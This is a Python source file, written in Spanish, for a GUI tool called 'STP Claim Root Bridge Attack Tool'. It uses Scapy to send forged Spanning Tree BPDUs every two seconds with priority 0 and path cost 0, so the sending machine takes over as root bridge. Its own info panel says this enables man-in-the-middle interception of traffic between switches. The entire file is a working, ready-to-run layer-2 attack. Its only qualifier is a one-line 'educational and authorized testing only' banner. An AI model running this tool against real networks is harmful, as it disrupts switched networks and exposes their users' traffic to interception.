#!/usr/bin/env python3

from scapy.all import *
import threading
import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox
from datetime import datetime
import sys
import os
import time

DEFAULT_INTERFACE = "eth0"
DEFAULT_BRIDGE_ID = "0000.0000.0001"
DEFAULT_PRIORITY = 0
DEFAULT_ROOT_PATH_COST = 0

class STPAttacker:
    
    def __init__(self, interface, bridge_id, priority, root_path_cost):
        self.interface = interface
        self.bridge_id = bridge_id
        self.priority = priority
        self.root_path_cost = root_path_cost
        self.attacker_mac = None
        self.is_running = False
        self.bpdu_count = 0
        self.gui_callback = None
        
    def _build_bpdu_packet(self):
        """Construye un paquete BPDU malicioso para reclamar ser Root Bridge"""
        
        # Convertir Bridge ID de formato string a bytes
        bridge_id_bytes = bytes.fromhex(self.bridge_id.replace(".", "").replace(":", ""))
        
        # Dirección MAC multicast STP (01:80:C2:00:00:00)
        stp_multicast = "01:80:c2:00:00:00"
        
        # Construir paquete BPDU
        ethernet = Dot3(dst=stp_multicast, src=self.attacker_mac)
        llc = LLC(dsap=0x42, ssap=0x42, ctrl=0x03)
        
        # STP BPDU - Configuration BPDU
        stp_header = STP(
            proto=0,                    # Protocol ID = 0 (STP)
            version=0,                  # Version = 0 (STP original)
            bpdutype=0,                 # Type = 0 (Configuration BPDU)
            bpduflags=0,                # Flags = 0
            rootid=self.priority,       # Root Bridge Priority (menor = mejor)
            rootmac=self.attacker_mac,  # Root Bridge MAC
            pathcost=self.root_path_cost,  # Root Path Cost = 0 (somos la raíz)
            bridgeid=self.priority,     # Bridge ID Priority
            bridgemac=self.attacker_mac, # Bridge MAC
            portid=0x8001,              # Port ID
            age=0,                      # Message Age
            maxage=20,                  # Max Age
            hellotime=2,                # Hello Time
            fwddelay=15                 # Forward Delay
        )
        
        packet = ethernet / llc / stp_header
        return packet
    
    def _send_bpdu_loop(self):
        """Envía BPDUs continuamente para mantener el estado de Root Bridge"""
        
        if self.gui_callback:
            self.gui_callback('log', f"Iniciando ataque STP en interfaz {self.interface}")
            self.gui_callback('log', f"MAC del atacante: {self.attacker_mac}")
            self.gui_callback('log', f"Bridge Priority: {self.priority}")
            self.gui_callback('log', f"Enviando BPDUs maliciosos...")
        
        while self.is_running:
            try:
                bpdu_packet = self._build_bpdu_packet()
                
                # Enviar BPDU
                sendp(bpdu_packet, iface=self.interface, verbose=0)
                
                self.bpdu_count += 1
                
                if self.gui_callback and self.bpdu_count % 10 == 0:
                    self.gui_callback('log', f"[BPDU] Enviado #{self.bpdu_count} - Reclamando Root Bridge")
                    self.gui_callback('update_stats', {
                        'bpdu_sent': self.bpdu_count,
                        'status': 'Activo'
                    })
                
                # Enviar cada 2 segundos (Hello Time típico)
                time.sleep(2)
                
            except Exception as e:
                if self.gui_callback:
                    self.gui_callback('log', f"ERROR enviando BPDU: {str(e)}")
                break
    
    def start_attack(self, callback=None):
        """Inicia el ataque STP"""
        self.gui_callback = callback
        self.is_running = True
        
        try:
            # Obtener MAC de la interfaz
            self.attacker_mac = get_if_hwaddr(self.interface)
            
            if self.gui_callback:
                self.gui_callback('log', "="*60)
                self.gui_callback('log', "ATAQUE STP CLAIM ROOT BRIDGE INICIADO")
                self.gui_callback('log', "="*60)
            
            # Iniciar envío de BPDUs
            self._send_bpdu_loop()
            
        except Exception as e:
            if self.gui_callback:
                self.gui_callback('log', f"ERROR: {str(e)}")
    
    def stop_attack(self):
        """Detiene el ataque"""
        self.is_running = False


class STPAttackGUI:
    
    def __init__(self, root):
        self.root = root
        self.root.title("STP Claim Root Bridge Attack Tool")
        self.root.geometry("900x700")
        self.root.resizable(True, True)
        self.attack_thread = None
        self.attacker = None
        self._build_interface()
    
    def _build_interface(self):
        main_container = ttk.Frame(self.root, padding="15")
        main_container.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))
      
        config_section = ttk.LabelFrame(main_container, text="Configuracion del Ataque STP", padding="10")
        config_section.grid(row=0, column=0, columnspan=2, sticky=(tk.W, tk.E), pady=(0, 10))
        
        ttk.Label(config_section, text="Interfaz de Red:").grid(row=0, column=0, sticky=tk.W, padx=5)
        self.interface_entry = ttk.Entry(config_section, width=20)
        self.interface_entry.insert(0, DEFAULT_INTERFACE)
        self.interface_entry.grid(row=0, column=1, padx=5)
        
        ttk.Label(config_section, text="Bridge Priority:").grid(row=0, column=2, sticky=tk.W, padx=(30, 5))
        self.priority_entry = ttk.Entry(config_section, width=20)
        self.priority_entry.insert(0, str(DEFAULT_PRIORITY))
        self.priority_entry.grid(row=0, column=3, padx=5)
        
        ttk.Label(config_section, text="Root Path Cost:").grid(row=1, column=0, sticky=tk.W, padx=5, pady=(5, 0))
        self.cost_entry = ttk.Entry(config_section, width=20)
        self.cost_entry.insert(0, str(DEFAULT_ROOT_PATH_COST))
        self.cost_entry.grid(row=1, column=1, padx=5, pady=(5, 0))
        
        ttk.Label(config_section, text="Bridge ID:").grid(row=1, column=2, sticky=tk.W, padx=(30, 5), pady=(5, 0))
        self.bridge_id_entry = ttk.Entry(config_section, width=20)
        self.bridge_id_entry.insert(0, DEFAULT_BRIDGE_ID)
        self.bridge_id_entry.grid(row=1, column=3, padx=5, pady=(5, 0))
        
        # Información de ayuda
        help_frame = ttk.Frame(config_section)
        help_frame.grid(row=2, column=0, columnspan=4, pady=(10, 0))
        
        help_text = "Priority menor = Mayor prioridad. 0 = Maxima prioridad (Root Bridge)"
        ttk.Label(help_frame, text=help_text, font=('Arial', 9, 'italic'), foreground='blue').pack()
        
        stats_section = ttk.LabelFrame(main_container, text="Estado del Ataque", padding="10")
        stats_section.grid(row=1, column=0, columnspan=2, sticky=(tk.W, tk.E), pady=(0, 10))
        
        self.bpdu_label = ttk.Label(stats_section, text="BPDUs Enviados: 0", font=('Arial', 11, 'bold'))
        self.bpdu_label.grid(row=0, column=0, sticky=tk.W, padx=10)
        
        self.status_label = ttk.Label(stats_section, text="Estado: Detenido", 
                                      font=('Arial', 11, 'bold'), foreground='gray')
        self.status_label.grid(row=0, column=1, sticky=tk.W, padx=10)
        
        

        info_section = ttk.LabelFrame(main_container, text="Informacion del Ataque STP", padding="10")
        info_section.grid(row=2, column=0, columnspan=2, sticky=(tk.W, tk.E), pady=(0, 10))
        
        info_text = """
Ataque STP Claim Root Bridge:
- Envia BPDUs maliciosos reclamando ser el Root Bridge
- Priority 0 = Maxima prioridad (inferior a cualquier switch legitimo)
- Root Path Cost 0 = Distancia 0 a la raiz (porque SOMOS la raiz)
- Los switches reconfiguraran su topologia para usar ESTE dispositivo como raiz
- Permite Man-in-the-Middle interceptando todo el trafico entre switches
        """
        
        info_label = tk.Label(info_section, text=info_text, justify=tk.LEFT, 
                             font=('Arial', 9), bg='#f0f0f0')
        info_label.pack(fill=tk.BOTH, expand=True)
        
      

        logs_section = ttk.LabelFrame(main_container, text="Registro de Actividad", padding="10")
        logs_section.grid(row=3, column=0, columnspan=2, sticky=(tk.W, tk.E, tk.N, tk.S), pady=(0, 10))
        
        self.log_area = scrolledtext.ScrolledText(logs_section, height=15, state="disabled",
                                                  wrap=tk.WORD, font=('Courier', 9))
        self.log_area.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))
        
        

        controls_section = ttk.Frame(main_container)
        controls_section.grid(row=4, column=0, columnspan=2, pady=(0, 5))
        
        self.start_btn = ttk.Button(controls_section, text="Iniciar Ataque STP",
                                    command=self.start_attack, width=25)
        self.start_btn.grid(row=0, column=0, padx=5)
        
        self.stop_btn = ttk.Button(controls_section, text="Detener Ataque",
                                   command=self.stop_attack, state="disabled", width=25)
        self.stop_btn.grid(row=0, column=1, padx=5)
        
        self.clear_btn = ttk.Button(controls_section, text="Limpiar Log",
                                    command=self.clear_log, width=25)
        self.clear_btn.grid(row=0, column=2, padx=5)
        
        # Configurar expansión
        self.root.columnconfigure(0, weight=1)
        self.root.rowconfigure(0, weight=1)
        main_container.columnconfigure(0, weight=1)
        main_container.rowconfigure(3, weight=1)
        logs_section.columnconfigure(0, weight=1)
        logs_section.rowconfigure(0, weight=1)
    
    def log_message(self, message):
        timestamp = datetime.now().strftime("%H:%M:%S")
        self.log_area.config(state="normal")
        self.log_area.insert(tk.END, f"[{timestamp}] {message}\n")
        self.log_area.config(state="disabled")
        self.log_area.see(tk.END)
    
    def gui_update_callback(self, action, data):
        if action == 'log':
            self.log_message(data)
        elif action == 'update_stats':
            self.bpdu_label.config(text=f"BPDUs Enviados: {data['bpdu_sent']}")
            if data['status'] == 'Activo':
                self.status_label.config(text="Estado: Atacando (Root Bridge)", foreground='red')
    
    def start_attack(self):
        interface = self.interface_entry.get().strip()
        priority = self.priority_entry.get().strip()
        cost = self.cost_entry.get().strip()
        bridge_id = self.bridge_id_entry.get().strip()
        
        if not all([interface, priority, cost, bridge_id]):
            messagebox.showerror("Error", "Completa todos los campos de configuracion")
            return
        
        try:
            priority = int(priority)
            cost = int(cost)
        except ValueError:
            messagebox.showerror("Error", "Priority y Cost deben ser numeros")
            return
        
        if os.geteuid() != 0:
            messagebox.showerror("Error", "Debes ejecutar este script con privilegios de root (sudo)")
            return
        
        # Crear instancia del atacante
        self.attacker = STPAttacker(interface, bridge_id, priority, cost)
        
        # Iniciar thread del ataque
        self.attack_thread = threading.Thread(
            target=self.attacker.start_attack,
            args=(self.gui_update_callback,),
            daemon=True
        )
        self.attack_thread.start()
        
        # Actualizar botones
        self.start_btn.config(state="disabled")
        self.stop_btn.config(state="normal")
        self.interface_entry.config(state="disabled")
        self.priority_entry.config(state="disabled")
        self.cost_entry.config(state="disabled")
        self.bridge_id_entry.config(state="disabled")
        
        self.log_message("="*60)
        self.log_message("ATAQUE STP CLAIM ROOT BRIDGE INICIADO")
        self.log_message("="*60)
    
    def stop_attack(self):
        if self.attacker:
            self.attacker.stop_attack()
            self.log_message("="*60)
            self.log_message("ATAQUE DETENIDO")
            self.log_message("="*60)
        
        # Actualizar botones
        self.start_btn.config(state="normal")
        self.stop_btn.config(state="disabled")
        self.interface_entry.config(state="normal")
        self.priority_entry.config(state="normal")
        self.cost_entry.config(state="normal")
        self.bridge_id_entry.config(state="normal")
        self.status_label.config(text="Estado: Detenido", foreground='gray')
    
    def clear_log(self):
        self.log_area.config(state="normal")
        self.log_area.delete(1.0, tk.END)
        self.log_area.config(state="disabled")
        self.log_message("Log limpiado")


def main():
    print("\n" + "="*70)
    print("   STP CLAIM ROOT BRIDGE ATTACK TOOL")
    print("   SOLO PARA PROPOSITOS EDUCATIVOS Y PRUEBAS AUTORIZADAS")
    print("="*70 + "\n")
    
    if os.geteuid() != 0:
        print("[ERROR] Este script requiere privilegios de root")
        print("Ejecuta con: sudo python3 stp_attack.py\n")
        sys.exit(1)
    
    root = tk.Tk()
    app = STPAttackGUI(root)
    root.mainloop()


if __name__ == "__main__":
    main()
